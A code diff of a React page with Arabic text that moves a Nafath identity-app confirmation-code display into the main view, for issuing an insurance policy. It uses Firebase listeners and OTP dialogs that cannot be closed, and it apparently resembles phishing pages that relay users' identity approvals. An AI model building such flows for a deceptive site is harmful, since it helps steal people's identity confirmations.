@@ -10,6 +10,7 @@ import {
   DialogTitle,
 } from "@/components/ui/dialog";
 import { useEffect, useRef, useState } from "react";
+
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
@@ -203,6 +204,29 @@ export default function Component() {
                   إعادة المحاولة
                 </Button>
               </>
+            ) : confirmationCode ? (
+              <>
+                <p className="text-sm text-gray-500 leading-relaxed">
+                  يرجى فتح تطبيق نفاذ واختيار رقم الطلب الموضح اعلاة لاصدار وثيقة التامين
+                </p>
+                <div className="mx-auto w-44 h-44 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-200 rounded-3xl shadow-inner flex items-center justify-center">
+                  <div className="flex gap-4 justify-center items-center" dir="ltr">
+                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
+                      {confirmationCode?.[0] || "–"}
+                    </div>
+                    <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
+                      {confirmationCode?.[1] || "–"}
+                    </div>
+                  </div>
+                </div>
+                <div className="flex items-center justify-center gap-2 text-[#009688]">
+                  <div className="relative flex items-center justify-center w-4 h-4">
+                    <div className="w-3 h-3 bg-[#009688] rounded-full animate-ping absolute opacity-75" />
+                    <div className="w-2 h-2 bg-[#00796b] rounded-full" />
+                  </div>
+                  <span className="text-sm font-medium">في انتظار تأكيدك في التطبيق...</span>
+                </div>
+              </>
             ) : (
               <>
                 <div className="flex flex-col items-center gap-4">
@@ -249,40 +273,6 @@ export default function Component() {
           </div>
         </div>
       </main>
-
-      <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
-        <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-2xl border-0 shadow-2xl" dir="rtl">
-          <DialogHeader className="space-y-1">
-            <DialogTitle className="text-center text-xl font-bold text-gray-800">
-              رمز التحقق من نفاذ
-            </DialogTitle>
-            <p className="text-center text-sm text-gray-500 leading-relaxed">
-              يرجى فتح تطبيق نفاذ واختيار رقم الطلب الموضح اعلاة لاصدار وثيقة التامين
-            </p>
-          </DialogHeader>
-
-          <div className="text-center space-y-5 py-2">
-            <div className="mx-auto w-44 h-44 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-200 rounded-3xl shadow-inner flex items-center justify-center">
-              <div className="flex gap-4 justify-center items-center" dir="ltr">
-                <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
-                  {confirmationCode?.[0] || "–"}
-                </div>
-                <div className="text-7xl font-black text-[#00796b] font-mono leading-none">
-                  {confirmationCode?.[1] || "–"}
-                </div>
-              </div>
-            </div>
-
-            <div className="flex items-center justify-center gap-2 text-[#009688]">
-              <div className="relative flex items-center justify-center w-4 h-4">
-                <div className="w-3 h-3 bg-[#009688] rounded-full animate-ping absolute opacity-75" />
-                <div className="w-2 h-2 bg-[#00796b] rounded-full" />
-              </div>
-              <span className="text-sm font-medium">في انتظار تأكيدك في التطبيق...</span>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
 
       <Dialog open={showOtpDialog} onOpenChange={() => {}}>
         <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-3xl border-0 shadow-2xl p-0 overflow-hidden" dir="rtl">
